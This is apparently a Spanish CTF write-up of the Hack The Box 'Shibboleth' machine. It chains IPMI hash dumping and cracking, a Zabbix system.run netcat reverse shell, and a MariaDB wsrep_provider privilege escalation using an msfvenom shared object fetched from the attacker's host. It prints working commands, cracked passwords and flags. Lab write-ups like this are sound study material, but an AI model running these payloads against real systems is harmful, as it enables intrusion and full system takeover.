---
layout: post
title: Shibboleth - WriteUp
author: WildZarek
permalink: /htb/shibboleth
excerpt: "Máquina Linux de dificultad media en la que veremos qué es IPMI y cómo explotarlo, también tocaremos Zabbix: un Sistema de Monitorización de Redes del que abusaremos para lograr ejecución remota de comandos y finalmente explotaremos un CVE de MySQL para ganar acceso privilegiado al sistema."
description: "Máquina Linux de dificultad media en la que veremos qué es IPMI y cómo explotarlo, también tocaremos Zabbix: un Sistema de Monitorización de Redes del que abusaremos para lograr ejecución remota de comandos y finalmente explotaremos un CVE de MySQL para ganar acceso privilegiado al sistema."
date: 2022-04-02
header:
  teaser: /assets/images/hackthebox/machines/shibboleth.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Web Exploiting, Privilege Escalation]
tags: [UDP, IPMI, ZABBIX, RCE, MYSQL, MARIADB, CVE, PIVOTING]
---

<p align="center"><img src="/assets/images/hackthebox/machines/shibboleth.png"></p>

## Fecha de Resolución

<p align="center">
	<a href="https://www.hackthebox.com/achievement/machine/18979/410">
		<img src="/assets/images/hackthebox/machines/shibboleth/pwned_date.png">
	</a>
</p>

## Fase de Reconocimiento

Podemos empezar con el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro  | Descripción |
| -----------| :---------- |
| -p-        | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS        | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Envia paquetes no más lentos que 5000 por segundo        |
| --open     | Mostrar sólo los puertos que esten abiertos              |
| -vvv       | Triple verbose para ver en consola los resultados        |
| -n         | No efectuar resolución DNS                               |
| -Pn        | No efectuar descubrimiento de hosts                      |
| -oG        | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.124 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 01:26 CET
Initiating SYN Stealth Scan at 01:26
Scanning 10.10.11.124 [65535 ports]
Discovered open port 80/tcp on 10.10.11.124
Completed SYN Stealth Scan at 01:27, 13.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.124
Host is up, received user-set (0.070s latency).
Scanned at 2022-01-30 01:26:55 CET for 13s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
           Raw packets sent: 67562 (2.973MB) | Rcvd: 66312 (2.653MB)
```

Identificamos un único puerto abierto:

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web |

Vamos a obtener más información con un escaneo específico sobre el puerto que hemos encontrado.

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 80 10.10.11.124 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 01:34 CET
Nmap scan report for 10.10.11.124
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
```

Vemos que se aplica una redirección hacia **`http://shibboleth.htb/`**, por lo que vamos a añadir un virtualhost en nuestro archivo **`/etc/hosts`**

```console
p3ntest1ng:~$ echo '10.10.11.124 shibboleth.htb' | sudo tee -a /etc/hosts
```

Analicemos el puerto **80** con un script de reconocimiento HTTP básico de **`Nmap`** y la herramienta **`whatweb`**.

| Parámetro | Descripción |
| --------- | :---------- |
| --script  | Ejecución de scripts escritos en LUA. Usamos **http-enum** |
| -p        | Escanea sobre el puerto especificado |
| -oN       | Guarda el output en un archivo con formato normal |

```console
p3ntest1ng:~$ nmap --script http-enum -p 80 10.10.11.124 -oN webScan

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 02:02 CET
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.046s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   
|_  /forms/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

```console
p3ntest1ng:~$ whatweb http://shibboleth.htb/
http://shibboleth.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.124], Lightbox, PoweredBy[enterprise], Script, Title[FlexStart Bootstrap Template - Index]
```

Probemos con **`wfuzz`** a ver qué encontramos, primero con un diccionario pequeño y si no encuentro nada, usaré uno más grande.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Muestra el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --hc 404  | Oculta todos los códigos de estado 404 |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://shibboleth.htb/FUZZ 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000001:   200        1323 L   4114 W     59474 Ch    "http://shibboleth.htb/"                                                                                                    
000000013:   403        9 L      28 W       279 Ch      ".htpasswd"                                                                                                                 
000000011:   403        9 L      28 W       279 Ch      ".hta"                                                                                                                      
000000012:   403        9 L      28 W       279 Ch      ".htaccess"                                                                                                                 
000000499:   301        9 L      28 W       317 Ch      "assets"                                                                                                                    
000001667:   301        9 L      28 W       316 Ch      "forms"                                                                                                                     
000002020:   200        1323 L   4114 W     59474 Ch    "index.html"                                                                                                                
000003588:   403        9 L      28 W       279 Ch      "server-status"                                                                                                             

Total time: 0
Processed Requests: 4614
Filtered Requests: 4606
Requests/sec.: 0
```
Revisemos brevemente la página para ver el contenido:

![Website](/assets/images/hackthebox/machines/shibboleth/website.png)

No hay nada que nos sea de utilidad en la página, veamos si existen subdominios:

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Mostrar el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --sc 200  | Muestra los códigos de estado 200 |
| -H        | Realiza una consulta de tipo header |
| -u        | Especifica la URL para la consulta |
| -t        | Nos permite lanzar el comando con N threads |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200 -H "Host: FUZZ.shibboleth.htb" -u http://shibboleth.htb/ -t 100 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000346:   200        29 L     219 W      3684 Ch     "monitoring"                                                                                                                
000000390:   200        29 L     219 W      3684 Ch     "zabbix"                                                                                                                    
000000099:   200        29 L     219 W      3684 Ch     "monitor"                                                                                                                   

Total time: 367.3388
Processed Requests: 114441
Filtered Requests: 114438
Requests/sec.: 311.5407
```

Hemos encontrado 3 subdominios, los añadimos a nuestro archivo **`/etc/hosts`** de nuevo para poder acceder.
Observamos un panel de acceso de nombre **`Zabbix`**, veamos si podemos conseguir algo más de información sobre esto.

```console
p3ntest1ng:~$ whatweb http://zabbix.shibboleth.htb/
http://zabbix.shibboleth.htb/ [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[PHPSESSID], IP[10.10.11.124], Meta-Author[Zabbix SIA], PasswordField[password], Script, Title[Shibboleth Data Systems: Zabbix], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block]
```

No hay información útil que nos pueda servir con esto, veamos en el navegador los subdominios encontrados:

![Zabbix](/assets/images/hackthebox/machines/shibboleth/zabbix.png)

Probemos a iniciar sesión con credenciales genéricas para ver el resultado.

![Error](/assets/images/hackthebox/machines/shibboleth/error.png)

Podemos buscar en Google si existen credenciales por defecto para este panel de acceso.
En la página oficial del proyecto encuentro la siguiente documentación:
https://www.zabbix.com/documentation/4.0/en/manual/appliance

Tras una breve lectura, averiguamos que las credenciales por defecto son: **`Admin:zabbix`**

![Credentials](/assets/images/hackthebox/machines/shibboleth/credentials.png)

En este caso no tenemos suerte y no logramos iniciar sesión, por lo que nos toca buscar otra vía distinta. Miremos los puertos **`UDP`** por si acaso.

```console
p3ntest1ng:~$ sudo nmap --top-ports 1000 -sU -v 10.10.11.124

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 06:50 CET
Initiating Ping Scan at 06:50
Scanning 10.10.11.124 [4 ports]
Completed Ping Scan at 06:50, 0.06s elapsed (1 total hosts)
Initiating UDP Scan at 06:50
Scanning shibboleth.htb (10.10.11.124) [1000 ports]
...[snip]...
Completed UDP Scan at 07:07, 1011.68s elapsed (1000 total ports)
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.053s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1011.95 seconds
           Raw packets sent: 1198 (56.085KB) | Rcvd: 1970 (155.387KB)
```

Vemos que el puerto **`623`** está abierto, busquemos en Google información sobre este puerto: **`port 623 asf-rmcp`**

![UDP Port](/assets/images/hackthebox/machines/shibboleth/udp.png)

¿Qué es [IPMI](https://www.ibm.com/docs/es/power9?topic=ipmi-overview)?

> La IPMI (Intelligent Platform Management Interface) es una interfaz de gestión de hardware basada en mensajes estandarizados.
> En el núcleo de IPMI hay un chip de hardware conocido como BMC (Baseboard Management Controller - controlador de gestión de placa base) o MC (Management Controller - controlador de gestión).

## Fase de Explotación

En la página [HackTricks](https://book.hacktricks.xyz/pentesting/623-udp-ipmi) se detalla la vulnerabilidad que podemos tratar de explotar.
Necesitamos instalar la herramienta **`ipmitool`**:

```console
p3ntest1ng:~$ sudo apt update && sudo apt install ipmitool
```

Para agilizar el proceso, he buscado en Google un exploit ya desarrollado que automatice esta parte:

![exploit](/assets/images/hackthebox/machines/shibboleth/exploit.png)

Clonamos el repositorio en nuestra máquina y ejecutamos la herramienta:

```console
p3ntest1ng:~$ git clone https://github.com/c0rnf13ld/ipmiPwner
Clonando en 'ipmiPwner'...
remote: Enumerating objects: 34, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 34 (delta 14), reused 27 (delta 14), pack-reused 7
Recibiendo objetos: 100% (34/34), 16.79 KiB | 781.00 KiB/s, listo.
Resolviendo deltas: 100% (14/14), listo.
```

Instalamos los requisitos necesarios para la herramienta con ayuda del script que viene incluído **`requirements.sh`**

```console
p3ntest1ng:~$ cd ipmiPwner && sudo ./requirements.sh
```

Y una vez finalice ya podemos utilizar la herramienta, siguiendo la ayuda ejecutamos tal que así:

```console
p3ntest1ng:~$ sudo python3 ipmipwner.py --host 10.10.11.124 -c john -oH hash -pW /usr/share/wordlists/rockyou.txt
[*] Checking if port 623 for host 10.10.11.124 is active
[*] Using the list of users that the script has by default
[*] Brute Forcing
[*] Number of retries: 2
[*] The username: Administrator is valid                                                                                    
[*] Saving hash for user: Administrator in file: "hash"
[*] The hash for user: Administrator
   \_ $rakp$a4a3a2a0822b00008e7cfd7387a9898c956341dee3a91dee89ab5adf605bf7dda40edaae45dc0709a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$cee947cb97cc31372da0ac3fe395bc6a3759576c
[*] Starting the hash cracking with john

Using default input encoding: UTF-8
Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepumkinpie1  (10.10.11.124 Administrator)
1g 0:00:00:10 DONE (2022-01-30 08:21) 0.09587g/s 710025p/s 710025c/s 710025C/s iluve.p..ilovejesus789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Tenemos la contraseña del usuario **`Administrator`**: **`ilovepumkinpie1`** y ya podemos acceder al panel **`Zabbix`**

![Logged](/assets/images/hackthebox/machines/shibboleth/logged.png)

Si nos vamos hasta **`Configuration`** podemos ver un apartado **`Discovery`**, y dentro tenemos definida la red local que está desactivada por lo que vamos a activarla. La seleccionamos y le damos al botón **`Enable`**.

![LAN](/assets/images/hackthebox/machines/shibboleth/lan.png)

Tenemos que lograr llegar hasta este recurso, si os fijáis en la captura anterior hace mención a [Zabbix Agent](https://www.zabbix.com/zabbix_agent).
Lo interesante de esto es que si leemos la [documentación](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent) vemos que contiene un campo con la opción **`system.run`**,
que nos permite ejecutar comandos a nivel de sistema:

![SystemRun](/assets/images/hackthebox/machines/shibboleth/systemrun.png)

Será aquí donde metamos nuestra shell inversa, así que vamos a ello. Primero volvemos a **`Configuration`**, aquí vemos el host y varios apartados relativos al mismo (Applications, Items, Triggers, etc),
en nuesto caso nos interesa **`Items`**, le damos click y creamos un nuevo item dándole al botón superior derecho **`Create item`**.

![CreateItem](/assets/images/hackthebox/machines/shibboleth/createitem.png)

En el boton Select elegimos de la lista desplegable la opción **`system.run`**, esta consta de dos opciones:
{% raw %}
~~~html
system.run[command,<mode>]
~~~
{% endraw %}

Tenemos dos posibles modos, **`wait`** y **`nowait`**, pero hay que tener en cuenta que la primera provoca que la conexión no sea estable,
así que elegimos la segunda y nos quedará de esta forma nuestro comando:

{% raw %}
~~~html
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.29 9999 >/tmp/f,nowait]
~~~
{% endraw %}

Ahora nos ponemos en escucha con **`nc -nlvp 9999`** y finalmente le damos al botón **`Test`** y **`Get value`** para obtener nuestra shell:

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.11.124] 48474
/bin/sh: 0: can't access tty; job control turned off
$ whoami && id
zabbix
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
```

Hagamos el habitual tratamiento a la tty para poder movernos con comodidad por la shell.

```console
$ script /dev/null -c bash
Script started, file is /dev/null
zabbix@shibboleth:/$ ^Z
zsh: suspended  nc -nlvp 9999
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 9999
                               reset xterm
zabbix@shibboleth:/$ export TERM=xterm
zabbix@shibboleth:/$ export SHELL=bash
```

Veamos dónde tenemos la flag del usuario:

```console
zabbix@shibboleth:/$ find / -type f -name user.txt 2>/dev/null
/home/ipmi-svc/user.txt
zabbix@shibboleth:/$ cat /home/ipmi-svc/user.txt
cat: /home/ipmi-svc/user.txt: Permission denied
```

No tenemos permisos porque somos el usuario **`Zabbix`**, tenemos que pivotar al usuario **`ipmi-svc`**, podemos intentar reutilizar la contraseña que ya tenemos.

```console
zabbix@shibboleth:/$ su ipmi-svc
Password: ilovepumkinpie1
ipmi-svc@shibboleth:/$ cat ~/user.txt
d340117f259139ebfa467d1db7595e2a
```

## Escalada de Privilegios

Lo primero es comprobar si tenemos algún permiso a nivel de sudo, pero en este caso no tenemos ninguno:

```console
ipmi-svc@shibboleth:/$ sudo -l
[sudo] password for ipmi-svc: 
Sorry, user ipmi-svc may not run sudo on shibboleth.
ipmi-svc@shibboleth:/$ 
```

Busquemos algún binario SUID/GUID, pwnkit (pkexec), etc:

```console
ipmi-svc@shibboleth:/$ find \-perm -4000 2>/dev/null
./usr/bin/chfn
./usr/bin/su
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/mount
./usr/bin/fusermount
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/at
./usr/bin/chsh
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/openssh/ssh-keysign
ipmi-svc@shibboleth:/$ which pkexec | xargs ls -la
-rwxr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
```

No encontramos nada de utilidad y tampoco podemos aprovechar el pwnkit porque está parcheado, busquemos puertos locales con netstat.

```console
ipmi-svc@shibboleth:/$ netstat -punta
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:10050           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.10.11.124:55136      1.1.1.1:53              SYN_SENT    -                   
tcp        0    286 10.10.11.124:48474      10.10.16.29:9999        ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::10050                :::*                    LISTEN      -                   
tcp6       0      0 :::10051                :::*                    LISTEN      -                   
tcp6       0      0 10.10.11.124:80         10.10.16.29:60368       TIME_WAIT   -                   
tcp6       0      0 ::1:10051               ::1:55600               TIME_WAIT   -                   
tcp6       0      0 ::1:10051               ::1:55678               TIME_WAIT   -                   
tcp6       0      0 10.10.11.124:80         10.10.16.29:60358       TIME_WAIT   -                   
tcp6       0      0 ::1:10051               ::1:55594               TIME_WAIT   -                   
tcp6       0      0 10.10.11.124:80         10.10.16.29:60370       TIME_WAIT   -                   
tcp6       0      0 ::1:10051               ::1:55590               TIME_WAIT   -                   
tcp6       0      0 ::1:10051               ::1:55656               TIME_WAIT   -                   
tcp6       0      0 10.10.11.124:80         10.10.16.29:60364       TIME_WAIT   -                   
tcp6       0      0 ::1:10051               ::1:55624               TIME_WAIT   -                   
tcp6       0      0 10.10.11.124:80         10.10.16.29:60366       TIME_WAIT   -                   
tcp6       0      0 10.10.11.124:80         10.10.16.29:60362       TIME_WAIT   -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:161           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:623             0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:50467         127.0.0.53:53           ESTABLISHED -                   
udp6       0      0 ::1:161                 :::*                                -   
```

Vemos el puerto **`3306`** que generalmente se corresponde al servicio **`MySQL`**,
podemos revisar los archivos de configuración de Zabbix, para ello buscamos los archivos asociados al grupo **`ipmi-svc`**

```console
ipmi-svc@shibboleth:/$ find / -group ipmi-svc 2>/dev/null | grep -vE "proc|sys"
...[snip]...
/etc/zabbix/zabbix_server.conf
```

Nos movemos al directorio **`/etc/zabbix`** y revisamos este archivo, grepeando por coincidencias relativas a la palabra **DB**:

```console
ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf | grep DB
### Option: DBHost
# DBHost=localhost
### Option: DBName
# DBName=
DBName=zabbix
### Option: DBSchema
# DBSchema=
### Option: DBUser
# DBUser=
DBUser=zabbix
### Option: DBPassword
DBPassword=bloooarskybluh
### Option: DBSocket
# DBSocket=
### Option: DBPort
# DBPort=
### Option: StartDBSyncers
#	Number of pre-forked instances of DB Syncers.
# StartDBSyncers=4
### Option: DBTLSConnect
#	verify_full - connect using TLS, verify certificate and verify that database identity specified by DBHost
#	On MariaDB starting from version 10.2.6 "required" and "verify_full" values are supported.
# DBTLSConnect=
### Option: DBTLSCAFile
#	(yes, if DBTLSConnect set to one of: verify_ca, verify_full)
# DBTLSCAFile=
### Option: DBTLSCertFile
# DBTLSCertFile=
### Option: DBTLSKeyFile
# DBTLSKeyFile=
### Option: DBTLSCipher
# DBTLSCipher=
### Option: DBTLSCipher13
# DBTLSCipher13=
```

Encontramos las credenciales de conexión: **`zabbix:bloooarskybluh`**, antes de nada vamos a comprobar la versión de MySQL.

```console
ipmi-svc@shibboleth:/etc/zabbix$ mysql --version
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
```

Sabiendo esto podemos buscar algún exploit en Google:

![CVE](/assets/images/hackthebox/machines/shibboleth/cve.png)

En el enlace nos indica cómo preparar el exploit utilizando **`msfvenom`** para construir el payload:

```console
p3ntest1ng:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=9999 -f elf-so -o exploit.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: exploit.so
```

Levantamos un servidor http con python3 en nuestra máquina y descargamos el exploit desde la máquina Shibboleth con wget...

```console
p3ntest1ng:~$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.124 - - [12/Feb/2022 15:13:53] "GET /exploit.so HTTP/1.1" 200 -
```

```console
ipmi-svc@shibboleth:/etc/zabbix$ mkdir /tmp/any0ne
ipmi-svc@shibboleth:/etc/zabbix$ cd !$
ipmi-svc@shibboleth:/tmp/any0ne$ wget http://10.10.16.29/exploit.so
--2022-02-12 14:31:20--  http://10.10.16.29/exploit.so
Connecting to 10.10.16.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘exploit.so’

exploit.so          100%[===================>]     476  --.-KB/s    in 0.04s   

2022-02-12 14:31:21 (11.1 KB/s) - ‘exploit.so’ saved [476/476]
```

Nos conectamos a MySQL tal y como nos indican en la explicación del exploit:
> mysql -u root -p -h 127.0.0.1 -e 'SET GLOBAL wsrep_provider="/tmp/any0ne/exploit.so";'

Sin embargo esto nos da error porque no tenemos permisos, tenemos que realizar este paso como el usuario **`zabbix`**
Nos ponemos en escucha en nuestra máquina con netcat antes de realizar este paso.

```console
ipmi-svc@shibboleth:/tmp/any0ne$ mysql -u zabbix -p
Enter password: bloooarskybluh
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 89577
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/any0ne/exploit.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
MariaDB [(none)]> 
```

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.11.124] 60162
whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
find / -type f -name root.txt
/root/root.txt
cat /root/root.txt
d9c18975fc2140ec3bd093291c797c4c
```

### ¡Gracias por leer hasta el final!

Una máquina interesante con cosas que no había visto hasta ahora, como por ejemplo el uso de IPMI y Zabbix.
La escalada de privilegios resultó bastante simple y es la parte que menos me ha gustado de la máquina.

#### Nos vemos en un próximo. ¡Feliz hacking! ☠